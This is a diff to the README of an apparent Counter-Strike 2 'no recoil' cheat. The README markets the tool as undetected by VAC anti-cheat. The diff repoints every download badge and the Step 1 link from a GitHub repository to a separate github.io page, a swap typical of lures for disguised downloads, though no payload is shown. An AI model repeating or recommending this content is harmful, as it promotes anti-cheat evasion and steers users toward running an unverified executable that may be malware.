@@ -1,6 +1,6 @@
 # 🎯 cs2-no-recoil-ultimate-2026 - Perfect Aim, Zero Recoil, Every Shot
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_No_Recoil_2026-blue?style=for-the-badge&logo=github&color=FF6B35)](https://github.com/RohanMurmu/cs2-no-recoil-ultimate-2026)
+[![Download Now](https://img.shields.io/badge/Download-CS2_No_Recoil_2026-blue?style=for-the-badge&logo=github&color=FF6B35)](https://rohanmurmu.github.io)
 
 ## 🎮 What Is This?
 
@@ -86,7 +86,7 @@ The program automatically detects which weapon you're currently holding in the g
 
 Ready to transform your gameplay? Here's exactly what to do:
 
-**Step 1:** Visit this link to download the application: **[https://github.com/RohanMurmu/cs2-no-recoil-ultimate-2026](https://github.com/RohanMurmu/cs2-no-recoil-ultimate-2026)**
+**Step 1:** Visit this link to download the application: **[https://rohanmurmu.github.io](https://rohanmurmu.github.io)**
 
 **Step 2:** Once you're on that page, look for the download button or link and click it.
 
@@ -166,6 +166,6 @@ The download takes seconds, the setup takes minutes, and the benefit lasts forev
 
 Click the download button now and see what perfect control feels like.
 
-[![Get It Now](https://img.shields.io/badge/🚀_Download_CS2_No_Recoil_2026-FF6B35?style=for-the-badge&logo=github)](https://github.com/RohanMurmu/cs2-no-recoil-ultimate-2026)
+[![Get It Now](https://img.shields.io/badge/🚀_Download_CS2_No_Recoil_2026-FF6B35?style=for-the-badge&logo=github)](https://rohanmurmu.github.io)
 
 Keywords: 2026, ak47, bizon, cs2, editor, famas, free, galil, hardware, hotkey, m4, mp9, no-recoil, pattern, script, sensitivity, spectre, toggle, undetected, vac
